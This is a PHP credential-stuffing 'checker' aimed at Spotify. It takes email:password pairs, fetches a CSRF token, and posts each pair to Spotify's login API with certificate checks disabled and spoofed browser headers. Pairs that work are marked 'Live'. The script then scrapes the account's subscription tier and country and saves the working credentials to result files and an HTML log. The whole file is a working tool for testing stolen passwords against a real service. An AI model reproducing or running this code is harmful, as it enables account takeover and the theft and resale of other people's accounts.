<?php
date_default_timezone_set("Asia/Kuala_Lumpur");
$date= date("dmy_Hi");
$delim = urldecode($_REQUEST['delim']);
$pisah = explode($delim, urldecode($_REQUEST['mailpass']));
      $ch = curl_init();
      curl_setopt($ch, CURLOPT_TIMEOUT, 600);
      curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie/cookie.txt");
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
      curl_setopt($ch, CURLOPT_VERBOSE, 0);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_HEADER, 1);
      curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
      curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.5",
      ));
      curl_setopt($ch, CURLOPT_URL, "https://accounts.spotify.com/login");
      $res = curl_exec($ch);
      preg_match_all("|Set-Cookie: csrf_token=(.*);Version=1;Domain=accounts.spotify.com;Path=/;Secure|", $res, $csrf);
      $csrf = trim($csrf[1][0]);

      curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",
            "Accept: application/json, text/plain, */*",
            "Accept-Language: en-US,en;q=0.5",
            "Content-Type: application/x-www-form-urlencoded",
            "Cookie: sp_landing=play.spotify.com%2F; sp_landingref=https%3A%2F%2Fwww.google.com%2F; user_eligible=0; spot=%7B%22t%22%3A1498061345%2C%22m%22%3A%22id%22%2C%22p%22%3Anull%7D; sp_t=ac1439ee6195be76711e73dc0f79f894; sp_new=1; csrf_token=$csrf; __bon=MHwwfC0xNjc4Mzc5MzU2fC03MDQ5MTkzMjk1MnwxfDF8MXwx; fb_continue=https%3A%2F%2Fwww.spotify.com%2Fid%2Faccount%2Foverview%2F; remember=brian%40gmail.com; _ga=GA1.2.153026989.1498061376; _gid=GA1.2.740264023.1498061376"
      ));
      curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
      curl_setopt($ch, CURLOPT_URL, "https://accounts.spotify.com/api/login");
      curl_setopt($ch, CURLOPT_POST, 1);
      curl_setopt($ch, CURLOPT_HEADER, 0);
      curl_setopt($ch, CURLOPT_POSTFIELDS,"remember=true&username=$pisah[0]&password=$pisah[1]&csrf_token=$csrf");
      $res = curl_exec($ch);
      $res = json_decode($res);
      $email = urldecode($pisah[0]);
      if(isset($res->error) && trim($res->error) == "errorInvalidCredentials" ) {
      echo '{"error":2,"msg":"<b><font color=red>Die| </font></b> '.$pisah[0].'<font color=gray>|</font>'.$pisah[1].'"}';
      } elseif(isset($res->displayName) || stripos($json_encode($res), "displayName")) {
            curl_setopt($ch, CURLOPT_URL, "https://www.spotify.com/account/overview/");
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                  "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",
                  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                  "Accept-Language: en-US,en;q=0.5",
            ));
            $res = curl_exec($ch);
            preg_match_all('|<use xlink:href="#icon-checkmark"></use></svg></span>(.*)</h3><p class="subscription-status subscription-compact">|', $res, $premium);
            preg_match_all('|<h3 class="product-name">(.*)</h3>|', $res, $free);
            preg_match_all('|<p class="form-control-static" id="card-profile-country">(.*)</p></div><div class="form-group">|', $res, $country);
            if(trim($premium[1][0]) == "Spotify Premium") { 
                  $status = "<font color='blue'>Premium</font>"; 
            file_put_contents("res/".$status."/".$date.".txt", $pisah[0]."|".$pisah[1]."\n", FILE_APPEND);

            } elseif(trim($premium[1][0]) == "Premium for Family") {
                  $status = "<font color='gold'>Admin Family</font>";
            file_put_contents("res/".$status."/".$date.".txt", $pisah[0]."|".$pisah[1]."\n", FILE_APPEND);

            } elseif(trim($free[1][0]) == "Spotify Free") {
                  $status = "<font color='red'>Free</font>";
            file_put_contents("res/".$status."/".$date.".txt", $pisah[0]."|".$pisah[1]."\n", FILE_APPEND);
            }
            $country = $country[1][0];
            $result["error"] = 0;
            $result["msg"] = "<font color=green><b>Live</b></font> | $pisah[0] | $pisah[1] | Type : $status | Country : $country | [ Acc : Spotify ]";
      
            $a = fopen('priv/ddcode.html', 'a+');
            @fwrite($a, $result["msg"]."<br>");
            @fclose($a);
            die(json_encode($result));
            //          echo '{"error":0,"msg":"<div class=col-md-4><b><font color=green>LIVE</font></b></div> <div class=col-md-4>'.$pisah[0].'|'.$pisah[1].'</div><div class=col-md-4>Type:  <b>'.$status.'</b></div>"}';

      }



?> 